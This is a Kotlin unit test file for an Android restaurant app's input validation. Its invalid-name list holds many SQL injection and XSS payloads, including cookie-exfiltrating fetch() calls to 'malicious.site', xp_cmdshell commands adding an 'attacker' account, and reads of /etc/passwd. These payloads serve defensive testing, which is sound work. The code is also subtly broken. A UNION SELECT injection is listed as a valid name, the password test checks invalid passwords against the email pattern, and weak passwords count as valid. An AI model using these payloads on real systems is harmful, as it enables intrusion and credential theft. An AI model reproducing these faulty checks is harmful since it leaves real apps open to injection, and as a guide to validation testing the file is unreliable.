package com.devmobile.android.restaurant.authentication

import com.devmobile.android.restaurant.viewmodel.InputPatterns
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class FormActivityLT {

    val validNames = arrayOf(
        "Ana-Maria",
        "Carlos' UNION ALL SELECT NULL, username, password FROM users --",
        "João-Pedro",
        "Benjamín",
        "Frédéric",
        "Gérard",
        "Jörg",
        "Ivana",
        "Emilie",
        "María José",
        "François",
        "Søren",
        "Mårten",
        "Leïla",
        "Jürgen",
        "Charlotte",
        "Sébastien",
        "Götz",
        "René",
        "Lívia",
        "Karl-Heinz",
        "Đorđe",
        "Željko",
        "Brâncoveanu",
        "Aída",
        "Łukasz",
        "Cláudia",
        "Miguel-Angel",
        "Rafael",
        "Éric",
        "Héctor",
        "Sølvi",
        "Kristóf",
        "Anja",
        "Aleksandar",
        "Natasha",
        "Hélène",
        "Orhan",
        "Débora",
        "Ioana",
    )

    val invalidNames = arrayOf(
        "José; DROP TABLE users; --",
        "Luís' OR '1'='1",
        "André<svg/onload=alert(1)>",
        "Júlia\" OR \"1\"=\"1",
        "Marco; EXEC xp_cmdshell 'ls'",
        "Carla' OR 'x'='x",
        "André$%&*",
        "Ivana<script>alert('XSS')</script>",
        "Ana<scri<script>alert('XSS')</script>pt>",
        "María; DROP DATABASE test;",
        "François<img src=x onerror=alert(1)>",
        "Hugo' OR '1'='1' --",
        "Robert'); DROP TABLE users; --",
        "admin' OR '1'='1' --",
        "'; EXEC xp_cmdshell 'net user /add attacker password'; --",
        "Jane'; EXEC xp_cmdshell 'ls'; --",
        "Alice<iframe src=\"javascript('XSS')\"></iframe>",
        "Eve<script>alert('XSS')</script>",
        "Lucas'; DELETE FROM users WHERE 'a'='a'",
        "Nina' OR '1'='1' UNION SELECT * FROM sensitive_data --",
        "Zara<svg/onload=confirm('XSS')>",
        "Pedro' AND 1=CONVERT(int, (SELECT @@version)) --",
        "Marta' AND (SELECT COUNT() FROM users) > 0 --",
        "David<svg onload=fetch('http://malicious.site/steal?cookie=' + document.cookie)>",
        "Sofia' AND EXISTS (SELECT * FROM information_schema.tables) --",
        "Michael' AND 'a'='a' AND 1=1 --",
        "Hannah' AND (SELECT * FROM (SELECT COUNT(), CONCAT((SELECT database()), CHAR(58), FLOOR(RAND() * 2))x FROM information_schema.tables GROUP BY x) a) --",
        "Ella'; SELECT load_file('/etc/passwd') --",
        "Oscar' OR 1=1; UPDATE users SET is_admin = 1 --",
        "Grace' AND 1=(SELECT COUNT() FROM sysobjects WHERE xtype='U') --",
        "Irene' OR 1=1; DROP DATABASE mydatabase --",
        "Leo' OR 1=1; EXEC xp_cmdshell 'echo vulnerable' --",
        "Emma<svg/onload=fetch('http://malicious.site/steal?cookie=' + document.cookie)>",
        "Liam' UNION SELECT 1, username, password FROM users --",
        "Olivia'); SHUTDOWN; --",
        "Ava' AND (SELECT * FROM users WHERE username = 'admin') --",
        "Noah' OR 1=1; INSERT INTO logs (entry) VALUES ('Hacked') --",
        "Mia'; EXECUTE IMMEDIATE 'DROP TABLE secret_data' --",
        "Ethan' UNION SELECT NULL, NULL, NULL, NULL FROM sensitive_info --",
        "Charlotte<script>alert('XSS')</script>",
        "Amelia' OR 1=1; DELETE FROM logs --",
        "Benjamin<svg onload=alert('Hacked!')>",
        "Aiden' AND 1=1 UNION ALL SELECT table_name, column_name FROM information_schema.columns --",
        "James' AND (SELECT SLEEP(5)) --",
        "Lucas' AND (SELECT * FROM users WHERE username = 'admin' AND password = 'password') --",
        "Sophia' OR 1=1; DROP TABLE sensitive_info --",
        "Mason' AND (SELECT COUNT() FROM sysobjects WHERE xtype='U') = 1 --",
        "Harper' OR 1=1; SELECT * FROM secret_data --",
        "Alexander<svg onload=eval('alert(1)')>",
        "Ella' AND (SELECT COUNT(*) FROM users WHERE username = 'root') > 0 --",
        "Jack' UNION ALL SELECT 1, 'malicious', 'payload' --",
        "Zoe' AND (SELECT * FROM (SELECT CONCAT(username, CHAR(58), password) FROM users) x) --",
        "Lily'; EXEC xp_cmdshell 'dir'; --",
        "Sebastian' OR '1'='1' UNION ALL SELECT NULL, NULL FROM important_data --",
        "William<svg onload=eval('alert(2)')>",
        "Ella' OR EXISTS (SELECT * FROM users WHERE username = 'admin') --",
        "Jack' AND (SELECT * FROM users WHERE username = 'root' AND password = 'password') --",
        "Mila<script>confirm('XSS')</script>",
        "Isaac' UNION SELECT NULL, NULL, NULL FROM critical_info --",
        "Evelyn<iframe src=\"javascript('XSS')\"></iframe>"
    )

    val invalidEmails = arrayOf(
        "tetopetgmail.com",
        "toeiu'@gmail.com",
        "@gmail.com",
        "TPueopteitop@.com.br",
        "eopteitop@.com.br",
        "teteio@",
        ",",
        "."
    )
    val validEmails = arrayOf(
        "tetopet@gmail.com",
        "toeiu@gmail.com",
        "tioeutioe@gmail.com",
        "tioeutioe+@gmail.com",
        "toeuo293@gmail.com",
        "oietuoeituiotueioutoieutioeutioueiotuioetuoieutoieutioeuiotuet@gmail.com",
        "uetoiutoietu@gmail.com.br.br.br.br",
    )

    val invalidPasswords = arrayOf(
        "\"Naruto\"",
        "short1",
        "nouppercase1!",
        "ALLUPPERCASE!",
        "12345678",
        "password!",
        "!@#@!#@!#",
        "Onlylowercaseletters",
        "!@#$%^&*",
        "abcdefg",
        "1aB!",
        "1234567!",
        "aaaaaa1",
        "abcde!@",
        "ABCD1234",
        "short",
        "1a!b",
        "1234",
        "123!456",
        "pass!word",
        "a1!"
    )
    val validPasswords = arrayOf(
        "password1",
        "abc12345",
        "a1b2c3d4",
        "hello@2024",
        "Secure#123",
        "myP@ssw0rd",
        "test!1234",
        "w3lcom3@",
        "r3li@ble",
        "P@ssw0rd1",
        "Strong1!",
        "Pa$\$w0rd",
        "2024\$afe",
        "Gr3atPass!",
        "Myp@ssw0rd",
        "J1mmy#2024",
        "ChecK!t3",
        "Tru3Pass@",
        "f0rgetMe!",
        "Acc3ss!123",
    )

    @Test
    fun textPattern_CheckSupportName() {

        invalidNames.forEach { name ->

            assertFalse(
                "Name Valid: $name",
                InputPatterns.isMatch(InputPatterns.TEXT_PATTERN, name).first
            )
        }

        validNames.forEach { name ->

            assertTrue(
                "Name Invalid: $name",
                InputPatterns.isMatch(InputPatterns.TEXT_PATTERN, name).first
            )
        }
    }

    @Test
    fun emailPattern_CheckSupportEmail() {

        invalidEmails.forEach { email ->

            assertFalse(
                "Email valid: $email",
                InputPatterns.isMatch(InputPatterns.EMAIL_PATTERN, email).first
            )
        }

        validEmails.forEach { email ->

            assertTrue(
                "Email invalid: $email",
                InputPatterns.isMatch(InputPatterns.EMAIL_PATTERN, email).first
            )
        }
    }

    @Test
    fun passwordPattern_CheckSupportPassword() {

        this.invalidPasswords.forEach { password ->

            assertFalse(
                "Email valid: $password",
                InputPatterns.isMatch(InputPatterns.EMAIL_PATTERN, password).first
            )
        }

        validPasswords.forEach { password ->

            assertTrue(
                "Email invalid: $password",
                InputPatterns.isMatch(InputPatterns.PASSWORD_PATTERN, password).first
            )
        }
    }
}